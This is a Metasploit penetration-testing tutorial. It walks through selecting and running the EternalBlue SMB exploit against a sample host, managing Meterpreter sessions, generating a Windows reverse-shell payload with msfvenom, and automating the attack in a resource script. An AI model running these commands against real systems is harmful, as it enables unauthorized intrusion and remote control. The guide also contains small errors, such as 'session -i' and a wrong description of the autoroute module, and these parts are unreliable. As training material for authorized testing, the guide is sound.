# Detailed Documentation on Using Metasploit for Network Penetration Testing

## Introduction

Metasploit is a powerful penetration testing framework that allows security professionals and ethical hackers to identify, exploit, and manage vulnerabilities in a network. It is one of the most widely used tools for assessing network security. This detailed documentation will guide you through using Metasploit effectively for network penetration testing.

## Installation

Metasploit is available for various platforms. To install Metasploit, follow the instructions for your specific operating system:

- **Linux**: You can install Metasploit on Linux, such as Kali Linux, using package managers like APT. Run the following commands:
  
  ```bash
  sudo apt update
  sudo apt install metasploit-framework
  ```

- **macOS**: You can use Homebrew to install Metasploit on macOS. Run the following commands:

  ```bash
  brew update
  brew install metasploit
  ```

- **Windows**: Download the Windows installer from the official Metasploit website: [Metasploit Download Page](https://www.metasploit.com/)

## Basic Usage

### 1. Starting Metasploit

- Start Metasploit by running the following command:

  ```bash
  msfconsole
  ```

- This opens the Metasploit console.

### 2. Searching for Exploits

- You can search for available exploits using the `search` command within the Metasploit console. For example:

  ```bash
  search windows smb
  ```

- This command searches for exploits related to Windows SMB services.

### 3. Selecting an Exploit

- Use the `use` command to select an exploit module. For example:

  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  ```

- This selects the EternalBlue exploit, which targets Windows SMB services.

### 4. Setting Exploit Options

- Set the necessary options for the selected exploit module using the `set` command. For example:

  ```bash
  set RHOST 192.168.1.100
  ```

- This sets the remote host (target) IP address.

- You can use the `show options` command to view the current options and their values.

### 5. Running the Exploit

- To launch the selected exploit, use the `exploit` command:

  ```bash
  exploit
  ```

- This will attempt to exploit the target with the selected module.

### 6. Handling Sessions

- If the exploit is successful, you will get a Meterpreter or shell session. Use the `sessions` command to list active sessions:

  ```bash
  sessions
  ```

- Use the `session -i <session_number>` command to interact with a specific session:

  ```bash
  sessions -i 1
  ```

### 7. Post-Exploitation

- Once you have access to a remote system, you can perform various post-exploitation actions, such as gathering information, pivoting, or running additional exploits.

- Use Metasploit's post-exploitation modules to conduct these activities.

### 8. Exiting Metasploit

- To exit Metasploit, use the `exit` command:

  ```bash
  exit
  ```

## Advanced Usage

### 1. Using Meterpreter

- Metasploit can provide Meterpreter, a powerful post-exploitation tool. When you gain a Meterpreter session, you can interact with the target system extensively.

- To interact with a Meterpreter session, use the `sessions` command and then `session -i <session_number>` as shown earlier.

### 2. Creating Custom Exploits

- Metasploit allows you to create custom exploit modules. The `msfvenom` tool can generate payloads for your exploits.

- For example, you can create a Windows reverse shell payload with the following command:

  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<your_IP> LPORT=<your_port> -f exe -o payload.exe
  ```

- Then, use this payload in a custom Metasploit module.

### 3. Post-Exploitation Modules

- Metasploit includes a wide range of post-exploitation modules for activities like data exfiltration, privilege escalation, lateral movement, and more.

- Use the `search` command within the Metasploit console to find relevant post-exploitation modules.

### 4. Meterpreter Scripts

- You can extend the functionality of Meterpreter sessions by using built-in scripts. To list available scripts, use the `run post/multi/manage/autoroute` command, for example.

### 5. Resource Scripts

- Metasploit allows you to create resource scripts (`.rc`) that automate sequences of commands. For example, to automate the setup of an exploit:

  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST 192.168.1.100
  exploit
  ```

- Save this in a `.rc` file and execute it with `msfconsole -r script.rc`.

## Conclusion

Metasploit is a versatile and powerful tool for network penetration testing. This documentation provides an in-depth overview of its capabilities, from basic exploitation to advanced post-exploitation. Remember that ethical hacking guidelines must always be followed, and penetration testing should only be conducted on systems for which you have explicit permission. Respect privacy and data protection laws when conducting network penetration tests.
